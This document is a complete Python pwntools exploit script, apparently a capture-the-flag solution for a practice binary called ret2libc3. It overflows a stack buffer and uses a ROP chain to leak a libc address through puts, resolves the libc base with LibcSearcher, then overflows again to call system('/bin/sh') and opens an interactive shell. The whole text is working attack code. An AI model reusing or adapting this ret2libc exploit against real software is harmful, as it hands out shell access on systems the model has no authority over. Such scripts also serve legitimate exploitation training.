from pwn import *
sys.path.append('/home/li/Desktop/LibcSearcher')
from LibcSearcher import LibcSearcher # type: ignore
sh = process('./rop/ret2libc3')

ret2libc3 = ELF('./rop/ret2libc3')

puts_plt = ret2libc3.plt['puts']
libc_start_main_got = ret2libc3.got['__libc_start_main']
main = ret2libc3.symbols['main']

print("leak libc_start_main_got addr and return to main again")
payload = flat([b'A' * 112, puts_plt, main, libc_start_main_got])
sh.sendlineafter(b'Can you find it !?', payload)
print("get the related addr")
libc_start_main_addr = u32(sh.recv()[0:4])

libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

print("get shell")
payload = flat([b'A' * 104, system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
